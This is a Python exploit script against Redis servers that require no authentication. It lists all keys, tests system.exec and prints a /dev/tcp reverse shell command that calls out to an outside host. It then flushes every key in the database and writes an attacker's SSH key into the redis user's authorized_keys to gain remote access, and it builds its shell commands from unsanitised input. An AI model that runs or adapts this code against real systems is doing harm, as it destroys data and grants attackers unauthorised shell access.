import subprocess
import os
import paramiko
import time
import logging
import argparse

logging.basicConfig(filename='run.log', filemode='a', format='%(name)s - %(levelname)s - %(message)s',level=logging.INFO)
	
def checkAuthentication(host, port):
	print("[+] Trying to connect to Redis server at {host}:{port}".format(host=host,port=port))
	command = "redis-cli -h {host} -p {port} INFO".format(host=host, port=port)
	output = subprocess.check_output(command,shell=True).decode()
	logging.info("Redis check authentication: {output}".format(output=output))
	if "NOAUTH Authentication required." in output:
		print("[-] Redis server requires authentication!")
		return False
	else:
		print("[+] Redis server does not require authentication!")
		return True

def checkVersion(host,port):
	print("[+] Obtaining configuration information from redis server..")
	command = "redis-cli -h {host} -p {port} INFO".format(host=host, port=port)	
	output = subprocess.check_output(command,shell=True).decode().split("\n")
	logging.info("Redis check version: {output}".format(output=output))
	for x in output:
		if ("redis_version" in x) or ("redis_build_id" in x) or ("os" in x) or ("gcc_version" in x) or ("config_file" in x) or ("arch_bits:64" in x) or ("avg_ttl" in x):
			print("    {x}".format(x=x))
		else:
			continue

def getKeys(host,port):
	print("[+] Obtaining keys from redis server...")
	command = "redis-cli -h {host} -p {port} keys '*'".format(host=host, port=port)	
	output = subprocess.check_output(command,shell=True).decode().strip().split("\n")
	logging.info("Redis get keys command: {output}".format(output=output))
	count = 1
	if output[0] == '':
		print("    There are currently no keys in the redis server")
		return
	for x in output:
		print("    {count}){x}".format(count=count,x=x))
		count += 1

def checkExecuteCommands(host, port):
	command = "redis-cli -h {host} -p {port} system.exec 'id'".format(host=host, port=port)	
	output = subprocess.check_output(command,shell=True).decode()
	logging.info("Redis check system.exec command: {output}".format(output=output))
	if "ERR unknown command" in output:
		print("[-] Unable to execute commands via system.exec")
	else:
		reverse_command = "redis-cli -h 10.10.10.160 -p 6379 system.exec '/bin/bash -l > /dev/tcp/<IP Address>/<Port> 0<&1 2>&1'"
		print("[+] Able to execute commands via system.exec")
		print("[+] Possible reverse shell can be executed: {reverse_command}".format(reverse_command=reverse_command))

def generateSSHKeys():
	currentDirectory = os.getcwd()
	os.system('mkdir ssh')
	print("    Creating new folder at {currentDirectory}".format(currentDirectory=currentDirectory))
	newDirectory = currentDirectory + "/ssh"
	os.chdir(newDirectory)
	keyGenFileName = "id_rsa"
	print("    Creating a new SSH public key...")
	keyGenCommand = "ssh-keygen -t rsa -C \'acid_creative\' -f {keyGenFileName} -q -P ''".format(keyGenFileName=keyGenFileName)
	subprocess.check_output(keyGenCommand, shell=True)
	convertKeyToTextFileCommand = "(echo '\r\n\'; cat {keyGenFileName}.pub; echo  \'\r\n\') > spaced_key.txt".format(keyGenFileName=keyGenFileName)
	print("    Writing public key to spaced_key.txt...")	
	subprocess.check_output(convertKeyToTextFileCommand,shell=True)
		
def checkRedisRCE(host,port):
	print("[+] Testing RCE for redis server...")
	generateSSHKeys()
	username = "redis"
	key_file = os.getcwd() + "/id_rsa"
	print("    Flushing all external configurations...")
	flushAllCommand = "redis-cli -h {host} -p {port} flushall".format(host=host, port=port)	
	flushAllCommandOutput = subprocess.check_output(flushAllCommand,shell=True).decode()
	logging.info('Redis flushall command: {output}'.format(output=flushAllCommandOutput))
	print("    Importing key file into redis server...")
	importKeyCommand = "cat spaced_key.txt | redis-cli -h {host} -x set ssh_key".format(host=host)
	importKeyOutput = subprocess.check_output(importKeyCommand,shell=True).decode()
	logging.info("Redis import key: {output}".format(output=importKeyOutput))
	setDirCommand = "redis-cli -h {host} -p {port} config set dir /var/lib/redis/.ssh".format(host=host,port=port)
	setDbCommand = "redis-cli -h {host} -p {port} config set dbfilename 'authorized_keys'".format(host=host,port=port)
	setSaveCommand = "redis-cli -h {host} -p {port} save".format(host=host,port=port)
	print("    Setting directory on redis server to /var/lib/redis/.ssh...")
	saveDirOutput = subprocess.check_output(setDirCommand,shell=True).decode()
	logging.info("Redis set directory output: {output}".format(output=saveDirOutput))
	print("    Setting dbfilename on redis server...")
	setDbOutput = subprocess.check_output(setDbCommand,shell=True).decode()
	logging.info("Redis set DB filename: {output}".format(output=setDbOutput))
	print("    Saving private keys to redis server...")
	setSaveOutput = subprocess.check_output(setSaveCommand,shell=True).decode()
	logging.info("Redis save private keys: {output}".format(output=setSaveOutput))
	if testSSHConnection(host,port,username,key_file) == True:
		print("    - SSH Connection successful!")
		print("    - SSH Command : ssh -i id_rsa {username}@{host}".format(username=username,host=host))
		print("[+] RCE on redis server succeeded!") 
	else:
		print("[-] RCE on redis server failed!")
	
	

def testSSHConnection(host,port,username,key_file):
	print("    Testing SSH connection...")
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	time.sleep(5)
	try:
	    ssh.connect(host, username=username, key_filename=key_file)
	    return True
	except Exception as e:
	    print ("[-] An error has occured! Please check run.log")
	    logging.error("Exception occured during SSH connection", exc_info=True)
	    return False

def logic(host,port):
	try:
		checkVersion(host,port)
		getKeys(host,port)
		checkExecuteCommands(host,port)
		checkRedisRCE(host,port)
	except Exception as e:
		print("[-] An error has occured!")
		logging.error("An exception has occured in logic method",exc_info=True)
		
def main(host,port):
	if checkAuthentication(host,port) == True:
		logic(host,port)
	else:
		return
		
if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--ip', help='IP address of redis server')
	parser.add_argument('-p', '--port', help='Port of redis server')
	args = parser.parse_args()
	main(args.ip,args.port)
	